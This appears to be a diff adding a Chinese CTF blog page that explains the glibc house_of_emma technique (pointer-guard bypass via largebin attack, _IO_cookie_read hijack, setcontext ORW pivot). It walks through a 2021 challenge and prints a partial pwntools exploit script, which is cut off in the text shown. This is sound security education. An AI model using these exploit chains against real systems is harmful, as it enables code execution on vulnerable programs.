@@ -1,0 +1,753 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/wod.jpg">
+  <link rel="icon" href="/img/wod.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="CH13hh">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="house_of_emma前言：相比较于house_of_kiwi（house_of_kiwi），house_of_emma的手法更加刁钻，而且威力更大，条件比较宽松，只需要lagebin_attack即可完成。 当然把两着放到一起是因为它们都利用了__malloc_assest来刷新IO流，不同的是，house_of_kiwi是通过修改调用函数的指针，还有修改rdx（_IO_heaper_jum">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常回家看看之house_of_emma">
+<meta property="og:url" content="https://ch13hh.github.io/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/index.html">
+<meta property="og:site_name" content="CH13hh">
+<meta property="og:description" content="house_of_emma前言：相比较于house_of_kiwi（house_of_kiwi），house_of_emma的手法更加刁钻，而且威力更大，条件比较宽松，只需要lagebin_attack即可完成。 当然把两着放到一起是因为它们都利用了__malloc_assest来刷新IO流，不同的是，house_of_kiwi是通过修改调用函数的指针，还有修改rdx（_IO_heaper_jum">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913141818872-216299118.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913142155352-833767926.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913142805490-1090431446.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913142844429-1808357340.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913142915978-1396030382.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913142952490-1829861897.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913144050249-222088011.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913144159525-165967660.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913144241621-1184910082.png">
+<meta property="og:image" content="https://ch13hh.github.io/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913144310643-1290084998.png">
+<meta property="article:published_time" content="2024-09-13T06:52:01.000Z">
+<meta property="article:modified_time" content="2024-09-13T06:53:13.558Z">
+<meta property="article:author" content="CH13hh">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ch13hh.github.io/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913141818872-216299118.png">
+  
+  
+  
+  <title>常回家看看之house_of_emma - CH13hh</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ch13hh.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"AWdKxtM41CcPxu2EZoBdWpas-gzGzoHsz","app_key":"idRJngxDPrsuLA4G1dKyEewP","server_url":"https://awdkxtm4.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>CH13hh</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/zhuye.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="常回家看看之house_of_emma"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-13 14:52" pubdate>
+          2024年9月13日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          16 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">常回家看看之house_of_emma</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house_of_emma"></a><strong>house_of_emma</strong></h2><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a><strong>前言：</strong></h3><p><strong>相比较于house_of_kiwi（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/CH13hh/p/18405448">house_of_kiwi</a>），house_of_emma的手法更加刁钻，而且威力更大，条件比较宽松，只需要lagebin_attack即可完成。</strong></p>
+<p><strong>当然把两着放到一起是因为它们都利用了__malloc_assest来刷新IO流，不同的是，house_of_kiwi是通过修改调用函数的指针，还有修改rdx（_IO_heaper_jumps）的偏移达到目的的，条件需要两次任意地址写，相对来说比较苛刻，然后house_of_emma则是利用了vtable地址的合法性，在符合vtable的地方找到了一个函数_IO_cookie_read，这个函数存在_IO_cookie_jumps中，可以看一下。</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p _IO_cookie_jumps<br>$<span class="hljs-number">1</span> = &#123;<br>  __dummy = <span class="hljs-number">0</span>,<br>  __dummy2 = <span class="hljs-number">0</span>,<br>  __finish = <span class="hljs-number">0x7bc53c683dc0</span> &lt;_IO_new_file_finish&gt;,<br>  __overflow = <span class="hljs-number">0x7bc53c684790</span> &lt;_IO_new_file_overflow&gt;,<br>  __underflow = <span class="hljs-number">0x7bc53c684480</span> &lt;_IO_new_file_underflow&gt;,<br>  __uflow = <span class="hljs-number">0x7bc53c685560</span> &lt;__GI__IO_default_uflow&gt;,<br>  __pbackfail = <span class="hljs-number">0x7bc53c686640</span> &lt;__GI__IO_default_pbackfail&gt;,<br>  __xsputn = <span class="hljs-number">0x7bc53c6839b0</span> &lt;_IO_new_file_xsputn&gt;,<br>  __xsgetn = <span class="hljs-number">0x7bc53c685740</span> &lt;__GI__IO_default_xsgetn&gt;,<br>  __seekoff = <span class="hljs-number">0x7bc53c678ae0</span> &lt;_IO_cookie_seekoff&gt;,<br>  __seekpos = <span class="hljs-number">0x7bc53c685900</span> &lt;_IO_default_seekpos&gt;,<br>  __setbuf = <span class="hljs-number">0x7bc53c6826d0</span> &lt;_IO_new_file_setbuf&gt;,<br>  __sync = <span class="hljs-number">0x7bc53c682560</span> &lt;_IO_new_file_sync&gt;,<br>  __doallocate = <span class="hljs-number">0x7bc53c677ef0</span> &lt;__GI__IO_file_doallocate&gt;,<br>  __read = <span class="hljs-number">0x7bc53c6789c0</span> &lt;_IO_cookie_read&gt;,<br>  __write = <span class="hljs-number">0x7bc53c6789f0</span> &lt;_IO_cookie_write&gt;,<br>  __seek = <span class="hljs-number">0x7bc53c678a40</span> &lt;_IO_cookie_seek&gt;,<br>  __close = <span class="hljs-number">0x7bc53c678aa0</span> &lt;_IO_cookie_close&gt;,<br>  __stat = <span class="hljs-number">0x7bc53c6867a0</span> &lt;_IO_default_stat&gt;,<br>  __showmanyc = <span class="hljs-number">0x7bc53c6867d0</span> &lt;_IO_default_showmanyc&gt;,<br>  __imbue = <span class="hljs-number">0x7bc53c6867e0</span> &lt;_IO_default_imbue&gt;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>可以看见它位于_IO_cookie_jumps+0x38+0x38的位置，至于为什么不写_IO_cookie_jumps+0x70，这样为了方便后面理解。</strong></p>
+<p><strong>我们看看_IO_cookie_read都做了什么</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"> <span class="hljs-number">0x7bc53c6789c0</span> &lt;_IO_cookie_read&gt;       endbr64 <br>  <span class="hljs-number">0x7bc53c6789c4</span> &lt;_IO_cookie_read+<span class="hljs-number">4</span>&gt;     mov    rax, qword ptr [rdi + <span class="hljs-number">0xe8</span>]<br>  <span class="hljs-number">0x7bc53c6789cb</span> &lt;_IO_cookie_read+<span class="hljs-number">11</span>&gt;    ror    rax, <span class="hljs-number">0x11</span>  <br>  <span class="hljs-number">0x7bc53c6789cf</span> &lt;_IO_cookie_read+<span class="hljs-number">15</span>&gt;    xor    rax, qword ptr fs:[<span class="hljs-number">0x30</span>] <span class="hljs-comment">#解密处理</span><br>  <span class="hljs-number">0x7bc53c6789d8</span> &lt;_IO_cookie_read+<span class="hljs-number">24</span>&gt;    test   rax, rax<br>► <span class="hljs-number">0x7bc53c6789db</span> &lt;_IO_cookie_read+<span class="hljs-number">27</span>&gt;    je     _IO_cookie_read+<span class="hljs-number">38</span>                &lt;_IO_cookie_read+<span class="hljs-number">38</span>&gt;<br><br>  <span class="hljs-number">0x7bc53c6789dd</span> &lt;_IO_cookie_read+<span class="hljs-number">29</span>&gt;    mov    rdi, qword ptr [rdi + <span class="hljs-number">0xe0</span>]<br>  <span class="hljs-number">0x7bc53c6789e4</span> &lt;_IO_cookie_read+<span class="hljs-number">36</span>&gt;    jmp    rax  <span class="hljs-comment">#call rax</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>可以看见call rax 也就是我们如果控制了rax那么就可以控制程序流，但是在此之前可以看见对rax进行了解密处理，将rax循环右移0x11，然后再和fs+0x30处的位置异或得到最后的rax</strong></p>
+<p><strong>最后去查了一下，这个是glibc的<a target="_blank" rel="noopener" href="https://sourceware.org/glibc/wiki/PointerEncryption">PointerEncryption</a>（自指针加密），是glibc保护指针的一种方式，glibc是这样解释的：指针加密是 glibc 的一项安全功能，旨在增加攻击者在 glibc 结构中操纵指针（尤其是函数指针）的难度。此功能也称为 “指针修饰” 或 “指针守卫”。</strong></p>
+<p><strong>这个值存放在TLS段上，一般情况下我们泄露不了，但是我们可以通过largebin_attack把一个堆块地址写入这个地址，那么key就变成了堆块指针，所以我们只需要，进行相应的加密就可以控制rax达到任意地址。那么如果控制这个rax为system(“&#x2F;bin&#x2F;sh”)的地址，那么就可以跳转到此处执行shell。</strong></p>
+<p><strong>然而还有一个问题，就是如果程序使用了沙箱禁用了execve，那么还是要进行迁移，需要用到setcontext，但是我们知道，这个函数再glibc2.29以后控制的寄存器从原来的rdi变成了rdx，也就是我们要控制rdx的值，但是当处于*<em>_IO_cookie_read，会发现此时rdx的值为0，而rdi也就是我们伪造的fake_io堆块，那么需要一个gadget，既能将rdi mov到rdx，又能继续接下来的程序流。*</em></strong></p>
+<p><strong><img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913141818872-216299118.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><em><strong>*那么可以找到这样的一个gadget*</strong></em></p>
+<p><em><strong>*<img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913142155352-833767926.png" srcset="/img/loading.gif" lazyload alt="img">*</strong></em></p>
+<p><em><strong>*这个gadget可以将rdi+8处地址给rdx，而且最后call rdx+0x20那么我们久可以继续控制程序流了。*</strong></em></p>
+<p><strong>怎么控制呢，如果把rdx+0x20的地方给setcontext+61的话，可以继续控制rdx+0xe0和rdx+0xe8的位置，那么就可以控制程序流进行orw</strong></p>
+<h3 id="例题：-湖湘杯-2021-house-of-emma"><a href="#例题：-湖湘杯-2021-house-of-emma" class="headerlink" title="例题：[湖湘杯 2021]house_of_emma"></a><strong>例题：</strong>[湖湘杯 2021]house_of_emma</h3><p><strong>这个题目是一个vm的题目，需要输入opcode，来执行相应的效果。但是我们重心在house_of_emma上，但是这个opcode可以看看最后的exp，也不难理解，类似对你输入的指令进行8位分割</strong></p>
+<p><strong>add函数申请堆块大小在0x40f到0x500之间</strong></p>
+<p><strong><img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913142805490-1090431446.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>edit函数不能修改堆块之外的数据</strong></p>
+<p><strong><img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913142844429-1808357340.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>问题出在free函数，存在uaf漏洞</strong></p>
+<p><strong><img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913142915978-1396030382.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>show函数</strong></p>
+<p><strong><img src="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/3419447-20240913142952490-1829861897.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a><strong>分析：</strong></h3><p><strong>本题libc给的是2.34的，那么__free_hook，malloc_hook等被移除了，当然因为存在UAF，而且还可以edit,那么泄露libc地址和heap地址会很容易，我们要伪造IO链，因为最后会使用stdder实现报错输出，所以我们可以劫持这个链子，将_lock给成合法地址，vtable给成 *<em>_IO_cookie_jumps+0x38，前面提到了这样是因为最后会call _IO_cookie_jumps+0x38再加上0x38的地址，就会到_IO_cookie_read，然后使用call rax的gadget布置rdx，然后call rdx+0x20 进入setcontxt + 61,然后就是orw了。*</em></strong></p>
+<h3 id="EXP："><a href="#EXP：" class="headerlink" title="*EXP：*"></a><em><strong>*EXP：*</strong></em></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br><br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>io = process(<span class="hljs-string">&quot;emma&quot;</span>)<br><br><br>opcode = <span class="hljs-string">b&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>    <span class="hljs-keyword">global</span> opcode<br>    opcode += <span class="hljs-string">b&#x27;\x01&#x27;</span>+p8(index)+p16(size)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">global</span> opcode<br>    opcode += <span class="hljs-string">b&#x27;\x02&#x27;</span>+p8(index)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">global</span> opcode<br>    opcode += <span class="hljs-string">b&#x27;\x03&#x27;</span>+p8(index)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,msg</span>):<br>    <span class="hljs-keyword">global</span> opcode<br>    opcode += <span class="hljs-string">b&#x27;\x04&#x27;</span> + p8(index) + p16(<span class="hljs-built_in">len</span>(msg)) + msg<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>    <span class="hljs-keyword">global</span> opcode<br>    opcode += <span class="hljs-string">b&#x27;\x05&#x27;</span><br>    io.sendafter(<span class="hljs-string">&quot;Pls input the opcode&quot;</span>,opcode)<br>    opcode = <span class="hljs-string">b&quot;&quot;</span><br><br><span class="hljs-comment"># 加密函数 循环左移</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rotate_left_64</span>(<span class="hljs-params">x, n</span>):<br>    <span class="hljs-comment"># 确保移动的位数在0-63之间</span><br>    n = n % <span class="hljs-number">64</span><br>    <span class="hljs-comment"># 先左移n位</span><br>    left_shift = (x &lt;&lt; n) &amp; <span class="hljs-number">0xffffffffffffffff</span><br>    <span class="hljs-comment"># 然后右移64-n位，将左移时超出的位移动回来</span><br>    right_shift = (x &gt;&gt; (<span class="hljs-number">64</span> - n)) &amp; <span class="hljs-number">0xffffffffffffffff</span><br>    <span class="hljs-comment"># 合并两部分</span><br>    <span class="hljs-keyword">return</span> left_shift | right_shift<br><br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x410</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x410</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x420</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x410</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x430</span>)<br>show(<span class="hljs-number">2</span>)<br>run()<br>io.recvuntil(<span class="hljs-string">&quot;Done&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Done&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Done&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Done&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Done&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;Done\n&quot;</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0x1f30b0</span><br>suc(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>pop_rdi_addr = libc_base + <span class="hljs-number">0x000000000002daa2</span> <span class="hljs-comment">#: pop rdi; ret; </span><br>pop_rsi_addr = libc_base + <span class="hljs-number">0x0000000000037c0a</span> <span class="hljs-comment">#: pop rsi; ret; </span><br>pop_rdx_r12 = libc_base + <span class="hljs-number">0x00000000001066e1</span> <span 